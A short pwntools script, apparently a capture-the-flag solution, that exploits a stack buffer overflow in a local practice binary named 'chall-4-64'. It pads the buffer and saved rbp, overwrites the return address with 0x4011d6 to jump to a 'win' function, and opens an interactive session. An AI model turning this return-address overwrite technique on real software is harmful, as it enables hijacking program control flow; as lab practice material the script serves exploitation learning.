#!/usr/bin/env python3

from pwn import *

io = process("./chall-4-64")

exe = ELF("./chall-4-64")
# context.binary = exe
# context.arch = "amd64"

buf = 0x10
rbp = 0x8

puts_win = p64(0x4011d6)

payload = b"A" * buf + b"B" * rbp + puts_win

io.sendlineafter(b"Buf: ", payload)

io.interactive()
